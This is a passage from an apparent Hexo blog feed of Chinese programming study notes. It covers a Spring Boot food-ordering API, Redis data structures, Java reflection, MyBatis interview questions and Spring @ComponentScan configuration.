"http://xxx.com", &#125; ] &#125;, &#123; "name": "好吃的", "type": 2, "foods": [ &#123; "id": "123457", "name": "慕斯蛋糕", "price": 10.9, "description": "美味爽口", "icon": "http://xxx.com", &#125; ] &#125; ]&#125; 根据这个格式，我们先在application.yml文件中配置项目的目录： 12server: context-path: /sell 然后，构建ResultVO这个类用来封装返回前端的数据。 123456@Datapublic class ResultVO&lt;T&gt; &#123; private Integer code; private String msg; private T data;&#125; 对于类目，我们后端只需要返回name,type,foods三个，所以创建CategoryVO来传递： 123456789@Datapublic class CategoryVO &#123; @JsonProperty("type") private Integer categoryType; @JsonProperty("name") private String categoryName; @JsonProperty("foods") private List&lt;ProductVO&gt; productVOList;&#125; 这里为了避免名字打架，但是要符合数据传递的格式，用 @JsonProperty 解决。 对于foods，就是商品，里面也是只要传递指定的参数，所以也要封装一个： 12345678910111213@Datapublic class ProductVO &#123; @JsonProperty("id") private String productId; @JsonProperty("name") private String productName; @JsonProperty("price") private BigDecimal productPrice; @JsonProperty("description") private String productDescription; @JsonProperty("icon") private String productIcon;&#125; 下面就是controller： 1234567891011121314151617181920212223242526272829303132333435363738@RestController@RequestMapping("/buyer/product")public class BuyerProductController &#123; @Autowired private CategoryService categoryService; @Autowired private ProductService productService; @GetMapping("/list") public ResultVO list()&#123;// 1、查询所有上架商品 List&lt;ProductInfo&gt; productInfoList = productService.findAllUpProducts();// 2、从上架商品获取所有的类目type List&lt;Integer&gt; categoryTypeList = productInfoList.stream() .map(e -&gt; e.getCategoryType()) .collect(Collectors.toList()); List&lt;ProductCategory&gt; productCategoryList = categoryService.productCategoryListByType(categoryTypeList);// 3、数据拼装 List&lt;CategoryVO&gt; categoryVOList = new ArrayList&lt;&gt;(); for(ProductCategory productCategory:productCategoryList)&#123; CategoryVO categoryVO = new CategoryVO(); categoryVO.setCategoryName(productCategory.getCategoryName()); categoryVO.setCategoryType(productCategory.getCategoryType()); List&lt;ProductVO&gt; productVOList = new ArrayList&lt;&gt;(); for(ProductInfo productInfo:productInfoList)&#123; //这里需要判断商品和类目的类型是否一致，否则商品将会将所有的上架商品都列出来了 if(productInfo.getCategoryType().equals(productCategory.getCategoryType()))&#123; ProductVO productVO = new ProductVO(); BeanUtils.copyProperties(productInfo,productVO); productVOList.add(productVO); &#125; &#125; categoryVO.setProductVOList(productVOList); categoryVOList.add(categoryVO); &#125; return ResultVOUtil.success(categoryVOList); &#125;&#125; 思路：查询所有上架商品==》找出所有上架商品的类目类型==》根据类型找出所有类目==》数据封装（将商品放到对应类型的类目下） 对于返回结果，我们可以封装一下，否则要经常写重复的代码： 1234567891011121314151617181920212223public class ResultVOUtil &#123; public static ResultVO success(Object object)&#123; ResultVO resultVO = new ResultVO(); resultVO.setCode(0); resultVO.setMsg("成功"); resultVO.setData(object); return resultVO; &#125; public static ResultVO success()&#123; ResultVO resultVO = new ResultVO(); resultVO.setCode(0); resultVO.setMsg("成功"); return resultVO; &#125; public static ResultVO error(Integer code,String msg)&#123; ResultVO resultVO = new ResultVO(); resultVO.setCode(code); resultVO.setMsg(msg); return resultVO; &#125;&#125; 2、postman测试： 12get请求，openid是需要的，随便写一个：localhost:8080/sell/buyer/product/list?openid=abc123 返回结果： 123456789101112131415161718192021222324252627282930313233343536373839&#123; "code": 0, "msg": "成功", "data": [ &#123; "type": 2, "name": "夏日必备", "foods": [ &#123; "id": "124", "name": "养乐多", "price": 9.3, "description": "好喝的养乐多", "icon": "http://xxx" &#125; ] &#125;, &#123; "type": 3, "name": "冬日热销", "foods": [ &#123; "id": "125", "name": "脉动", "price": 4.3, "description": "好喝的脉动", "icon": "http://xxx" &#125;, &#123; "id": "126", "name": "脉动2号", "price": 5.3, "description": "更加好喝的脉动", "icon": "http://xxx" &#125; ] &#125; ]&#125; 3、针对现成的虚拟机，我们也可以对其发送请求，它里面已经部署好静态页面，我们可以看效果： 首先是输入虚拟机ip/#/order来到一个空白页面（否则会因为是微信要跳转） 打开浏览器的调试工具，在console下写document.console=’openid=abc123’,回车。 再访问虚拟机的ip，应该就可以看到页面了。 注意，这里还有一步是在虚拟机中要对nginx的配置文件配置访问的ip地址是本机。配置域名也在里面配。]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.redis基本数据结构的入门]]></title>
    <url>%2F2018%2F07%2F21%2F2.redis%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[介绍redis最基本的五种数据结构的操作。 由于不是md文件，所以在这里将我的学习笔记以有道云的链接形式分享出来。 有道云笔记-2.redis基本数据结构的入门 在这里，说一说每种数据结构的使用场景。 1. String——字符串最简单的结构，一般用作缓存，可以完全实现目前 Memcached 的功能，并且效率更高。 2. Hash——字典我们经常将一些结构化的信息打包成 hashmap，在客户端序列化后存储为一个字符串的值（一般是 JSON 格式） 比如用户的昵称、年龄、性别、积分等。这时候在需要修改其中某一项时，通常需要将字符串（JSON）取出来，然后进行反序列化，修改某一项的值，再序列化成字符串（JSON）存储回去。 简单修改一个属性就干这么多事情，消耗必定是很大的，也不适用于一些可能并发操作的场合（比如两个并发的操作都需要修改积分）。而 Redis 的 Hash 结构可以使你像在数据库中 Update 一个属性一样只修改某一项属性值。 3. List——列表List 说白了就是链表（redis 使用双端链表实现的 List），相信学过数据结构知识的人都应该能理解其结构。 使用 List 结构，我们可以轻松地实现最新消息排行等功能（比如新浪微博的 TimeLine ）。 List 的另一个应用就是消息队列，可以利用 List 的 *PUSH 操作，将任务存在 List 中，然后工作线程再用 POP 操作将任务取出进行执行。Redis 还提供了操作 List 中某一段元素的 API，你可以直接查询，删除 List 中某一段的元素。 4. Set——集合Set 就是一个集合，集合的概念就是一堆不重复值的组合。利用 Redis 提供的 Set 数据结构，可以存储一些集合性的数据。 比如在微博应用中，可以将一个用户所有的关注人存在一个集合中，将其所有粉丝存在一个集合。因为 Redis 非常人性化的为集合提供了求交集、并集、差集等操作，那么就可以非常方便的实现如共同关注、共同喜好、二度好友等功能，对上面的所有集合操作，你还可以使用不同的命令选择将结果返回给客户端还是存集到一个新的集合中。 共同好友、二度好友 利用唯一性，可以统计访问网站的所有独立 IP 好友推荐的时候，根据 tag 求交集，大于某个 threshold 就可以推荐 5. Sorted Set——有序集合和 Set 相比，Sorted Set 是将 Set 中的元素增加了一个权重参数 score，使得集合中的元素能够按 score 进行有序排列，比如一个存储全班同学成绩的 Sorted Set，其集合 value 可以是同学的学号，而 score 就可以是其考试得分，这样在数据插入集合的时候，就已经进行了天然的排序。 另外还可以用 Sorted Set 来做带权重的队列，比如普通消息的 score 为1，重要消息的 score 为2，然后工作线程可以选择按 score 的倒序来获取工作任务。让重要的任务优先执行。 带有权重的元素，比如一个游戏的用户得分排行榜 比较复杂的数据结构，一般用到的场景不算太多]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.java反射]]></title>
    <url>%2F2018%2F07%2F21%2F2.java%E5%8F%8D%E5%B0%84%2F</url>
    <content type="text"><![CDATA[反射这一块也是面试经常会被问到的，我从反射的基本概念到反射的一些面试题出发，再来理一理反射的知识。 1. 反射的作用我理解的java反射机制就是： 提供一套完善而强大的API“反射“类的结构。 打个比方，反射机制就像是一面镜子，而类就像是一个在照着镜子的人。 镜子（反射机制）照出（反射）了人的全貌（类的全方位的信息，例如方法，成员变量和构造器等的相关信息） 为什么要照镜子？ 因为不照镜子看不清楚自己的全貌，“镜子”就是为了解决这个问题出现的（为我们提供全面分析类的能力） 2. Class对象和实例对象想要理解反射首先需要知道Class这个类，它的全称是java.lang.Class类。java是面向对象的语言，讲究万物皆对象，即使强大到一个类，它依然是另一个类（Class类）的对象，换句话说，普通类是Class类的对象，即Class是所有类的类（There is a class named Class）。 我们知道java世界是运行在JVM之上的，我们编写的类代码，在经过编译器编译之后，会为每个类生成对应的.class文件，这个就是JVM可以加载执行的字节码。运行时期间，当我们需要实例化任何一个类时，JVM会首先尝试看看在内存中是否有这个类，如果有，那么会直接创建类实例；如果没有，那么就会根据类名去加载这个类，当加载一个类，或者当加载器(class loader)的defineClass()被JVM调用，便会为这个类产生一个Class对象（一个Class类的实例），用来表达这个类，该类的所有实例都共同拥有着这个Class对象，而且是唯一的。 3. 取得Class对象的三种方式我们假设有这么一个类叫MyClass： 1public class MyClass &#123; &#125; 通过“类名.class”的方式取得 1Class classInstance= MyClass.class; 例如： 123Class clazz = Car.class;Class cls1 = int.class;Class cls2 = String.class; 通过类创建的实例对象的getClass方法取得 12MyClass myClass = new MyClass();Class classInstance = myClass.getClass(); 通过Class类的静态方法forName方法取得（参数是带包名的完整的类名） 12345try &#123; Class classInstance = Class.forName("mypackage.MyClass");&#125; catch (ClassNotFoundException e) &#123; e.printStackTrace();&#125; 上面三种方法取得的对象都是相同的，所以效果上等价。 上面说MyClass是Class的对象，而这里又说classInstance也是Class的对象，而classInstance是MyClass的对象，是不是矛盾呢？这里只是说法而已，我们不要纠结那么多，其实classInstance是类类型，通过类类型可以得到一个类的属性和方法等参数，这是反射的基础。 4. 利用反射API全面分析类的信息——方法，成员变量，构造器反射的一大作用是用于分析类的结构，或者说用于分析和这个类有关的所有信息。而这些信息就是类的基本的组成： 方法，成员变量和构造器。 事实上，和我们上面所介绍的Class类和Class对象相似的是，一个类中的方法，成员变量和构造器也分别对应着一个对象 每个方法都对应有一个保存和该方法有关信息的Method对象， 这个对象所属的类是java.lang.reflect.Method; 每个成员变量都对应有一个保存和该变量有关信息的Field对象，这个对象所属的类是 java.lang.reflect.Field 每个构造器都对应有一个保存和该构造器有关信息的Constructor对象，这个对象所属的类是java.lang.reflect.Constructor 假设c是一个类的Class对象： 通过 c.getDeclaredMethods()可取得这个类中所有声明方法对应的Method对象组成的数组 通过 c.getDeclaredFields()可取得这个类中所有声明的成员变量对应的Field对象组成的数组 通过 c.getConstructors(); 可取得这个类中所有构造函数所对应的Constructor对象所组成的数组 1234567Method [] methods = c.getDeclaredMethods(); // 获取方法对象列表 Field [] fields = c.getDeclaredFields(); // 获取成员变量对象列表Constructor [] constructors = c.getConstructors(); // 获取构造函数对象列表xxx.getName()就可以打印出对应的名字了。 5. 更多的反射apigetMethods和getDeclaredMethods方法 getMethods取得的method对应的方法包括从父类中继承的那一部分，而 getDeclaredMethods取得的method对应的方法不包括从父类中继承的那一部分 一个普通的类，他们的基类都是Object，那么如果用getMethods，遍历得到的结果，会发现Object中的基础方法名都会被打印出来。诸如wait(),equals(),toString(),getClass(),notify(),notifyAll(),hashCode()等等。 通过method.getReturnType()获取方法返回值对应的Class对象12Class returnClass = method.getReturnType(); // 获取方法返回值对应的Class对象String returnName = returnClass.getName(); //获取返回值所属类的类名——也即返回值类型 通过method.getParameterTypes()获取方法各参数的Class对象组成的数组12345Class [] paramsClasses = method.getParameterTypes();for (Class pc: paramsClasses) &#123; String paramStr = pc.getName(); // 获取当前参数类型 paramsStr+=paramStr + " ";&#125; 获取成员变量类型对应的的Class对象123Field field = c.getDeclaredField("name"); // 取得名称为name的field对象field.setAccessible(true); // 这一步很重要！！！设置为true才能访问私有成员变量name的值！String nameValue = (String) field.get(obj); // 获取obj中name成员变量的值 通过getType方法读取成员变量类型的Class对象12Field field = class1.getDeclaredField(number");System.out.print(field.getType().getName()); 因为java权限的原因，直接读取私有成员变量的值是非法的（加了field.setAccessible(true)后就可以了），但仍可以直接读取私有成员变量的类型 利用反射API分析类中构造器信息123public class MyClass &#123; public MyClass(int a, String str)&#123;&#125;&#125; 12345678910111213public static void printContructorsMessage (Object obj) &#123;Class c = obj.getClass(); // 取得obj所属类对应的Class对象Constructor [] constructors = c.getDeclaredConstructors();for (Constructor constructor : constructors) &#123; Class [] paramsClasses = constructor.getParameterTypes(); String paramsStr = ""; for (Class pc : paramsClasses) &#123; String paramStr = pc.getName(); paramsStr+=paramStr + " "; &#125; System.out.println("构造函数的所有参数的类型列表：" + paramsStr);&#125;&#125; 运行结果： 1构造函数的所有参数的类型列表：int java.lang.String 6. 利用反射动态加载类，并用该类创建实例对象我们用普通的方式使用一个类的时候，类是静态加载的，而使用Class.forName(“XXX”)这种方式，则属于动态加载一个类 静态加载的类在编译的时候就能确定该类是否存在，但动态加载一个类的时候却无法在编译阶段确定是否存在该类，而是在运行时候才能够确定是否有这个类，所以要捕捉可能发生的异常 Class对象有一个newInstance方法，我们可以用它来创建实例对象 12Class classInstance = Class.forName("mypackage.MyClass");MyClass myClass = (MyClass) classInstance.newInstance(); 7. 总结 反射为我们提供了全面的分析类信息的能力，例如类的方法，成员变量和构造器等的相关信息，反射能够让我们很方便的获取这些信息， 而实现这个获取过程的关键是取得类的Class对象，然后根据Class对象取得相应的Method对象，Field对象和Constructor对象，再分别根据各自的API取得信息。 反射还为我们提供动态加载类的能力 API中getDeclaredXXX和getXXX的区别在于前者只获取本类声明的XXX（如成员变量或方法），而不获取超类中继承的XXX， 后者相反 API中， getXXXs（注意后面的s）返回的是一个数组， 而对应的 getXXX（”键”）按键获取一个值（这个时候因为可能报已检查异常所以要用try*catch语句包裹） 私有成员变量是不能直接获取到值的！因为java本身的保护机制，允许你取得私有成员变量的类型，但是不允许直接获取值，所以要对对应的field对象调用field.setAccessible(true) 放开权限 8. 面试什么是反射反射是一种能够在程序运行时动态访问、修改某个类中任意属性（状态）和方法（行为）的机制 反射机制能做什么 在运行时判断任意一个对象所属的类(父类和接口都可以) 在运行时构造任意一个类的对象 在运行时判断任意一个类所具有的成员变量和方法 在运行时调用任意一个对象的方法 生成动态代理 反射到底有什么具体的用处 操作因访问权限限制的属性和方法； 实现自定义注解； 动态加载第三方jar包，解决android开发中方法数不能超过65536个的问题； 按需加载类，节省编译和初始化APK的时间； 反射的原理是什么当我们编写完一个Java项目之后，每个java文件都会被编译成一个.class文件，这些Class对象承载了这个类的所有信息，包括父类、接口、构造函数、方法、属性等，这些class文件在程序运行时会被ClassLoader加载到虚拟机中。当一个类被加载以后，Java虚拟机就会在内存中自动产生一个Class对象。我们通过new的形式创建对象实际上就是通过这些Class来创建，只是这个过程对于我们是透明的而已。 反射的工作原理就是借助Class.java、Constructor.java、Method.java、Field.java这四个类在程序运行时动态访问和修改任何类的行为和状态。 如何获取Class对象 Class的forName()方法的返回值就是Class类型，也就是动态导入类的Class对象的引用 public static Class&lt;?&gt; forName(String className) throws ClassNotFoundException 每个类都会有一个名称为Class的静态属性，通过它也是可以获取到Class对象 Class clazz = Student.class; Object类中有一个名为getClass的成员方法，它返回的是对象的运行时类的Class对象。因为Object类是所有类的父类，所以，所有的对象都可以使用该方法得到它运行时类的Class对象 Student stu = new Student(); Class clazz = stu.getClass(); 反射的特点 优点 灵活、自由度高：不受类的访问权限限制，想对类做啥就做啥 缺点 性能问题 通过反射访问、修改类的属性和方法时会远慢于直接操作，但性能问题的严重程度取决于在程序中是如何使用反射的。如果使用得很少，不是很频繁，性能将不会是什么问题； 安全性问题 反射可以随意访问和修改类的所有状态和行为，破坏了类的封装性，如果不熟悉被反射类的实现原理，随意修改可能导致潜在的逻辑问题； 兼容性问题 因为反射会涉及到直接访问类的方法名和实例名，不同版本的API如果有变动，反射时找不到对应的属性和方法时会报异常； 另外，反射还有许多异常需要处理： 如何提高反射性能java应用反射的时候，性能往往是java程序员担心的地方，那么在大量运用反射的时候，性能的微弱提升，对这个系统而言都是如旱地逢甘霖。 setAccessible(true),可以防止安全性检查（做这个很费时） 做缓存，把要经常访问的元数据信息放入内存中，class.forName 太耗时 getMethods() 等方法尽量少用，尽量调用getMethod(name)指定方法的名称，减少遍历次数 java面试中面试官让你讲讲反射，应该从何讲起？先讲反射机制，反射就是程序运行期间JVM会对任意一个类洞悉它的属性和方法，对任意一个对象都能够访问它的属性和方法。依靠此机制，可以动态的创建一个类的对象和调用对象的方法。 其次就是反射相关的API，只讲一些常用的，比如获取一个Class对象。Class.forName(完整类名)。通过Class对象获取类的构造方法，class.getConstructor。根据class对象获取类的方法，getMethod和getMethods。使用class对象创建一个对象，class.newInstance等。 最后可以说一下反射的优点和缺点，优点就是增加灵活性，可以在运行时动态获取对象实例。缺点是反射的效率很低，而且会破坏封装，通过反射可以访问类的私有方法，不安全。]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.Mybatis面试问题集锦]]></title>
    <url>%2F2018%2F07%2F21%2F2.Mybatis%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6%2F</url>
    <content type="text"><![CDATA[mybatis面试知识点重灾区。 1、#{}和${}的区别是什么？${}是Properties文件中的变量占位符，它可以用于标签属性值和sql内部，属于静态文本替换，比如${driver}会被静态替换为com.mysql.jdbc.Driver。 #{}是sql的参数占位符，Mybatis会将sql中的#{}替换为?号，在sql执行前会使用PreparedStatement的参数设置方法，按序给sql的?号占位符设置参数值，比如ps.setInt(0, parameterValue)，#{item.name}的取值方式为使用反射从参数对象中获取item对象的name属性值，相当于param.getItem().getName()。 更加通俗的回答是： #{}是预编译处理，${}是字符串替换。 Mybatis在处理#{}时，会将sql中的#{}替换为?号，调用PreparedStatement的set方法来赋值； Mybatis在处理${}时，就是把${}替换成变量的值。 使用#{}可以有效的防止SQL注入，提高系统安全性。 2、Xml映射文件中，除了常见的select|insert|updae|delete标签之外，还有哪些标签？还有很多其他的标签，&lt;resultMap&gt;、&lt;parameterMap&gt;、&lt;sql&gt;、&lt;include&gt;、&lt;selectKey&gt;，加上动态sql的9个标签，trim|where|set|foreach|if|choose|when|otherwise|bind等，其中&lt;sql&gt;为sql片段标签，通过&lt;include&gt;标签引入sql片段，&lt;selectKey&gt;为不支持自增的主键生成策略标签。 3、最佳实践中，通常一个Xml映射文件，都会写一个Dao接口与之对应，请问，这个Dao接口的工作原理是什么？Dao接口里的方法，参数不同时，方法能重载吗？Dao接口，就是人们常说的Mapper接口，接口的全限名，就是映射文件中的namespace的值，接口的方法名，就是映射文件中MappedStatement的id值，接口方法内的参数，就是传递给sql的参数。 Mapper接口是没有实现类的，当调用接口方法时，接口全限名+方法名拼接字符串作为key值，可唯一定位一个MappedStatement: com.mybatis3.mappers.StudentDao.findStudentById，可以唯一找到namespace为com.mybatis3.mappers.StudentDao下面id = findStudentById的MappedStatement. 在Mybatis中，每一个&lt;select&gt;、&lt;insert&gt;、&lt;update&gt;、&lt;delete&gt;标签，都会被解析为一个MappedStatement对象。 Dao接口里的方法，是不能重载的，因为是全限名+方法名的保存和寻找策略。 Dao接口的工作原理是JDK动态代理，Mybatis运行时会使用JDK动态代理为Dao接口生成代理proxy对象，代理对象proxy会拦截接口方法，转而执行MappedStatement所代表的sql，然后将sql执行结果返回。 4、Mybatis是如何进行分页的？分页插件的原理是什么？Mybatis使用RowBounds对象进行分页，它是针对ResultSet结果集执行的内存分页，而非物理分页，可以在sql内直接书写带有物理分页的参数来完成物理分页功能，也可以使用分页插件来完成物理分页。 分页插件的基本原理是使用Mybatis提供的插件接口，实现自定义插件，在插件的拦截方法内拦截待执行的sql，然后重写sql，根据dialect方言，添加对应的物理分页语句和物理分页参数。 举例：select * from student，拦截sql后重写为：select t.* from （select * from student）t limit 0，10 5、简述Mybatis的插件运行原理，以及如何编写一个插件。Mybatis仅可以编写针对ParameterHandler、ResultSetHandler、StatementHandler、Executor这4种接口的插件，Mybatis使用JDK的动态代理，为需要拦截的接口生成代理对象以实现接口方法拦截功能，每当执行这4种接口对象的方法时，就会进入拦截方法，具体就是InvocationHandler的invoke()方法，当然，只会拦截那些你指定需要拦截的方法。 实现Mybatis的Interceptor接口并复写intercept()方法，然后在给插件编写注解，指定要拦截哪一个接口的哪些方法即可，记住，别忘了在配置文件中配置你编写的插件。 6、Mybatis执行批量插入，能返回数据库主键列表吗？能，JDBC都能，Mybatis当然也能。 7、Mybatis动态sql是做什么的？都有哪些动态sql？能简述一下动态sql的执行原理不？Mybatis动态sql可以让我们在Xml映射文件内，以标签的形式编写动态sql，完成逻辑判断和动态拼接sql的功能，Mybatis提供了9种动态sql标签trim|where|set|foreach|if|choose|when|otherwise|bind。 其执行原理为，使用OGNL从sql参数对象中计算表达式的值，根据表达式的值动态拼接sql，以此来完成动态sql的功能。 8、Mybatis是如何将sql执行结果封装为目标对象并返回的？都有哪些映射形式？第一种是使用&lt;resultMap&gt;标签，逐一定义列名和对象属性名之间的映射关系。 第二种是使用sql列的别名功能，将列别名书写为对象属性名，比如T_NAME AS NAME，对象属性名一般是name，小写，但是列名不区分大小写，Mybatis会忽略列名大小写，智能找到与之对应对象属性名，你甚至可以写成T_NAME AS NaMe，Mybatis一样可以正常工作。 有了列名与属性名的映射关系后，Mybatis通过反射创建对象，同时使用反射给对象的属性逐一赋值并返回，那些找不到映射关系的属性，是无法完成赋值的。 9、Mybatis能执行一对一、一对多的关联查询吗？都有哪些实现方式，以及它们之间的区别。能，Mybatis不仅可以执行一对一、一对多的关联查询，还可以执行多对一，多对多的关联查询，多对一查询，其实就是一对一查询，只需要把selectOne()修改为selectList()即可；多对多查询，其实就是一对多查询，只需要把selectOne()修改为selectList()即可。 关联对象查询，有两种实现方式，一种是单独发送一个sql去查询关联对象，赋给主对象，然后返回主对象。另一种是使用嵌套查询，嵌套查询的含义为使用join查询，一部分列是A对象的属性值，另外一部分列是关联对象B的属性值，好处是只发一个sql查询，就可以把主对象和其关联对象查出来。 那么问题来了，join查询出来100条记录，如何确定主对象是5个，而不是100个？其去重复的原理是&lt;resultMap&gt;标签内的&lt;id&gt;子标签，指定了唯一确定一条记录的id列，Mybatis根据&lt;id&gt;列值来完成100条记录的去重复功能，&lt;id&gt;可以有多个，代表了联合主键的语意。 同样主对象的关联对象，也是根据这个原理去重复的，尽管一般情况下，只有主对象会有重复记录，关联对象一般不会重复。 10、Mybatis是否支持延迟加载？如果支持，它的实现原理是什么？Mybatis仅支持association关联对象和collection关联集合对象的延迟加载，association指的就是一对一，collection指的就是一对多查询。在Mybatis配置文件中，可以配置是否启用延迟加载lazyLoadingEnabled=true|false。 它的原理是，使用CGLIB创建目标对象的代理对象，当调用目标方法时，进入拦截器方法，比如调用a.getB().getName()，拦截器invoke()方法发现a.getB()是null值，那么就会单独发送事先保存好的查询关联B对象的sql，把B查询上来，然后调用a.setB(b)，于是a的对象b属性就有值了，接着完成a.getB().getName()方法的调用。这就是延迟加载的基本原理。 当然了，不光是Mybatis，几乎所有的包括Hibernate，支持延迟加载的原理都是一样的。 11、Mybatis的Xml映射文件中，不同的Xml映射文件，id是否可以重复？不同的Xml映射文件，如果配置了namespace，那么id可以重复；如果没有配置namespace，那么id不能重复；毕竟namespace不是必须的，只是最佳实践而已。 原因就是namespace+id是作为Map&lt;String, MappedStatement&gt;的key使用的，如果没有namespace，就剩下id，那么，id重复会导致数据互相覆盖。有了namespace，自然id就可以重复，namespace不同，namespace+id自然也就不同。 12、Mybatis中如何执行批处理？使用BatchExecutor完成批处理。 13、Mybatis都有哪些Executor执行器？它们之间的区别是什么？Mybatis有三种基本的Executor执行器，SimpleExecutor、ReuseExecutor、BatchExecutor。 SimpleExecutor：每执行一次update或select，就开启一个Statement对象，用完立刻关闭Statement对象。 ReuseExecutor：执行update或select，以sql作为key查找Statement对象，存在就使用，不存在就创建，用完后，不关闭Statement对象，而是放置于Map&lt;String, Statement&gt;内，供下一次使用。简言之，就是重复使用Statement对象。 BatchExecutor：执行update（没有select，JDBC批处理不支持select），将所有sql都添加到批处理中（addBatch()），等待统一执行（executeBatch()），它缓存了多个Statement对象，每个Statement对象都是addBatch()完毕后，等待逐一执行executeBatch()批处理。与JDBC批处理相同。 作用范围：Executor的这些特点，都严格限制在SqlSession生命周期范围内。 14、Mybatis中如何指定使用哪一种Executor执行器？在Mybatis配置文件中，可以指定默认的ExecutorType执行器类型，也可以手动给DefaultSqlSessionFactory的创建SqlSession的方法传递ExecutorType类型参数。 15、Mybatis是否可以映射Enum枚举类？Mybatis可以映射枚举类，不单可以映射枚举类，Mybatis可以映射任何对象到表的一列上。映射方式为自定义一个TypeHandler，实现TypeHandler的setParameter()和getResult()接口方法。TypeHandler有两个作用，一是完成从javaType至jdbcType的转换，二是完成jdbcType至javaType的转换，体现为setParameter()和getResult()两个方法，分别代表设置sql问号占位符参数和获取列查询结果。 16、Mybatis映射文件中，如果A标签通过include引用了B标签的内容，请问，B标签能否定义在A标签的后面，还是说必须定义在A标签的前面？虽然Mybatis解析Xml映射文件是按照顺序解析的，但是，被引用的B标签依然可以定义在任何地方，Mybatis都可以正确识别。 原理是，Mybatis解析A标签，发现A标签引用了B标签，但是B标签尚未解析到，尚不存在，此时，Mybatis会将A标签标记为未解析状态，然后继续解析余下的标签，包含B标签，待所有标签解析完毕，Mybatis会重新解析那些被标记为未解析的标签，此时再解析A标签时，B标签已经存在，A标签也就可以正常解析完成了。 17、简述Mybatis的Xml映射文件和Mybatis内部数据结构之间的映射关系？Mybatis将所有Xml配置信息都封装到All-In-One重量级对象Configuration内部。在Xml映射文件中，&lt;parameterMap&gt;标签会被解析为ParameterMap对象，其每个子元素会被解析为ParameterMapping对象。&lt;resultMap&gt;标签会被解析为ResultMap对象，其每个子元素会被解析为ResultMapping对象。每一个&lt;select&gt;、&lt;insert&gt;、&lt;update&gt;、&lt;delete&gt;标签均会被解析为MappedStatement对象，标签内的sql会被解析为BoundSql对象。 18、为什么说Mybatis是半自动ORM映射工具？它与全自动的区别在哪里？Hibernate属于全自动ORM映射工具，使用Hibernate查询关联对象或者关联集合对象时，可以根据对象关系模型直接获取，所以它是全自动的。而Mybatis在查询关联对象或关联集合对象时，需要手动编写sql来完成，所以，称之为半自动ORM映射工具。 转自：https://my.oschina.net/zudajun/blog/747682 还有一个博客，先留着：https://blog.csdn.net/eaphyy/article/details/71190441]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.@ComponentScan自动扫描组件以及扫描规则]]></title>
    <url>%2F2018%2F07%2F21%2F2.%40ComponentScan%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E7%BB%84%E4%BB%B6%E4%BB%A5%E5%8F%8A%E6%89%AB%E6%8F%8F%E8%A7%84%E5%88%99%2F</url>
    <content type="text"><![CDATA[学习spring注解版来实现组件的注册。 配置文件中配置包扫描时这样配置的： 12&lt;!--包扫描，只要标注了@Controller，@Service，@Repository，@Component，就会被自动扫描到加入到容器中--&gt;&lt;context:component-scan base-package=&quot;com.swg&quot;/&gt; 现在用注解来实现这个功能： 只需要加上注解即可： 12@ComponentScan(value = "com.swg")//java8可以写多个@ComponentScan//java8以前虽然不能写多个，但是也可以实现这个功能，用@ComponentScans配置即可 我们增加BookController.java,BookService.java以及BookDao.java三个类，并且分别加上注解：@Controller，@Service，@Repository；那么包扫描就可以把这些类全部注册到IOC容器中了。 我们来打印一下目前所有注册到IOC容器的类的名称： 123456789@Testpublic void shouldAnswerWithTrue()&#123; ApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig.class); String[] names = applicationContext.getBeanDefinitionNames(); for(String name:names)&#123; System.out.println(name); &#125;&#125; 输出结果： 123456789101112org.springframework.context.annotation.internalConfigurationAnnotationProcessororg.springframework.context.annotation.internalAutowiredAnnotationProcessororg.springframework.context.annotation.internalRequiredAnnotationProcessororg.springframework.context.annotation.internalCommonAnnotationProcessororg.springframework.context.event.internalEventListenerProcessororg.springframework.context.event.internalEventListenerFactory//以上是spring IOC容器自身需要的组件，下面是我们自定义的组件mainConfig//主配置类，因为有注解@Configuration，而这个注解本身是有@Component的，所以也是一个beanbookController//@ControllerbookDao//@RepositorybookService//@Serviceperson//这是由自己@Bean注册进去的 上面的扫描路径是扫描所有的，有的时候我们需要排除掉一些扫描路径或者只扫描某个路径，如何做到呢？ 用excludeFilters来排除，里面可以指定排除规则，这里是按照ANNOTATION来排除，排除掉所有@Controller注解的类。classes也是个数组，可以排除很多。123@ComponentScan(value = "com.swg",excludeFilters = &#123; @ComponentScan.Filter(type = FilterType.ANNOTATION,classes = Controller.class)&#125;) 那么效果就是controller没有了，但是service和dao都在。 那如果我想只包含controller呢？ 123@ComponentScan(value = "com.swg", includeFilters = &#123; @ComponentScan.Filter(type = FilterType.ANNOTATION,classes = Controller.class)&#125;,useDefaultFilters = false) 注意要useDefaultFilters = false，因为默认为true，就是扫描所有，不设置为false无效。]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1、VirtualBox+Centos6.9下载、安装、网络配置]]></title>
    <url>%2F2018%2F07%2F21%2F1%E3%80%81VirtualBox%2BCentos6.9%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[因为项目需要linux环境下进行部署上线，所以需要准备一个虚拟机，我用的是centos6.9版本。 VirtualBox+Centos6.9下载、安装、网络配置—&gt;VirtualBox+Centos6.9下载、安装、网络配置]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1、初级排序算法的实现和性能测试]]></title>
    <url>%2F2018%2F07%2F21%2F1%E3%80%81%E5%88%9D%E7%BA%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%2F</url>
